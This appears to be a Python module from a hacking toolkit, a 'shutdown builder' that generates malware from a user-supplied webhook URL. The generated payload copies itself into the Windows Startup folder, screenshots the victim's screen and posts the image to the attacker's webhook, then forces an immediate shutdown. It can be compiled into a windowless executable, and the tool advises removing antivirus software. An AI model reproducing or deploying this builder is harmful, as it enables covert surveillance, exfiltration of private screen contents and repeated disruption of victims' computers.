
from Config.Config import *
from Config.Util import *

try:
   import webbrowser
   import re
   import shutil
   from tkinter import messagebox
except Exception as e:
   ErrorModule(e)


import os
from datetime import datetime
import requests


Title("shutdown_builder")

Slow(virus_banner) 
icon_path                        = "None"
def ConvertToExe(file_python, path_destination, name_file, icon_path=None):
        if sys.platform.startswith("win"):
            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Uninstallation of pathlib.. {reset}")
            subprocess.run(["python", "-m", "pip", "uninstall", "pathlib", "-y"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Upgrade pyinstaller.. {reset}")
            subprocess.run(["python", "-m", "pip", "install", "--upgrade", "pyinstaller"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif sys.platform.startswith("linux"):
            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Uninstallation of pathlib.. {reset}")
            subprocess.run(["python3", "-m", "pip3", "uninstall", "pathlib", "-y"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Upgrade pyinstaller.. {reset}")
            subprocess.run(["python3", "-m", "pip3", "install", "--upgrade", "pyinstaller"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Converting to executable..")

        try:
            script_path = os.path.abspath(file_python)
            working_directory = os.path.dirname(script_path)
            os.chdir(working_directory)

            pyinstaller = ['pyinstaller', '--onefile', '--distpath', path_destination, '--noconsole', script_path]

            if icon_path:
                pyinstaller.extend(['--icon', icon_path])

            result = subprocess.run(pyinstaller, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            if result.stderr:
                if "completed successfully" not in result.stderr:
                    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error during conversion: {white + result.stderr}")
                    Continue()
                    Reset()
                else:
                    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Conversion successful.")
            else:
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Conversion successful.")

            try:
                print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Removing temporary files from conversion.. {reset}")     
                shutil.rmtree(os.path.join(working_directory, "build"))
                os.remove(os.path.join(working_directory, f"{name_file}.spec"))
                os.remove(file_python)
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Temporary file removed.{reset}")
            except Exception as e:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Temporary file not removed: {white + str(e)}")
            
        except Exception as e:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error during conversion: {white + str(e)}")
            Continue()
            Reset()

webhook_url = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Webhook URL -> {reset}")
file_name = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Nom du Fichier -> {reset}")


file_python_relative = f'1-Output\\shutdown_creater\\{file_name}.py'
file_python = os.path.join(tool_path, "1-Output", "shutdown_creater", f"{file_name}.py")

path_destination_relative = "1-Output\\shutdown_creater"
path_destination = os.path.join(tool_path, "1-Output", "shutdown_creater")

#creation du keylogger

shutdown_path = os.path.join(tool_path,"1-Output","shutdown_creater",f"{file_name}.py")
with open(shutdown_path,'w', encoding='utf-8',) as file:
 file.write("""import shutil
import sys
import os
from datetime import datetime
import requests
from PIL import ImageGrab
            
webhook_url = """f'"{webhook_url}"'"""""""""""""""
def add_to_startup():
    # Dossier de démarrage Windows
    startup_path = os.path.join(os.getenv('APPDATA'),
                                r"Microsoft\Windows\Start Menu\Programs\Startup")

    # Le fichier actuel
    current_script = sys.argv[0]

    # Destination dans Startup
    destination = os.path.join(startup_path, os.path.basename(current_script))

    # Copier le script s'il n'est pas déjà présent
    if not os.path.exists(destination):
        shutil.copy(current_script, destination)
        
    else:
            egyegeyge=1
       

# Appeler la fonction
add_to_startup()
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Si le dossier n'existe pas (rare mais possible), fallback
if not os.path.exists(desktop_path):
    desktop_path = os.path.expanduser("~")

SCREENSHOT_FILE = os.path.join(desktop_path, "capture.png")

# 1. Prendre la capture d'écran
screenshot = ImageGrab.grab()
screenshot.save(SCREENSHOT_FILE)

# 2. Ouvrir l'image
try:
    os.startfile(SCREENSHOT_FILE)  # Windows
except:
    try:
        os.system(f"open '{SCREENSHOT_FILE}'")  # macOS
    except:
        os.system(f"xdg-open '{SCREENSHOT_FILE}'")  # Linux

# 3. Envoyer au webhook
with open(SCREENSHOT_FILE, "rb") as f:
    files = {
        "file": (SCREENSHOT_FILE, f, "image/png")
    }
    data = {
        "content": "📸 Nouvelle capture d'écran"
    }
    response = requests.post(webhook_url, data=data, files=files)

# Affichage du résultat côté console
if response.status_code == 204:
    i = 3
else:
    i = 2

os.system("shutdown /s /t 0")
    """)
print(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Creation du fichier ...")
print(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Creation du fichier Terminé")

Exeorpy = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Voulez-vous le convertir en .exe (y/n) -> {reset}")

if Exeorpy == "y" : 
     if not os.path.exists(path_destination):
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Files are missing, reinstall the tool and try again.")
            Continue()
            Reset()
        
     if os.path.exists(file_python):
            if not os.path.exists(icon_path):
                ConvertToExe(file_python, path_destination, file_name)
            else:
                ConvertToExe(file_python, path_destination, file_name, icon_path)
     else:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} The python file created previously was deleted, please remove your anti virus and try again.")

else :
   input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Creation du fichier python terminé appyuer sur entrer pour revenir au menu pruncipale -> {reset}")

input(f"{BEFORE + current_time_hour() + AFTER} {INPUT}  Appyuer sur entrer pour revenir au tool -> {reset}")
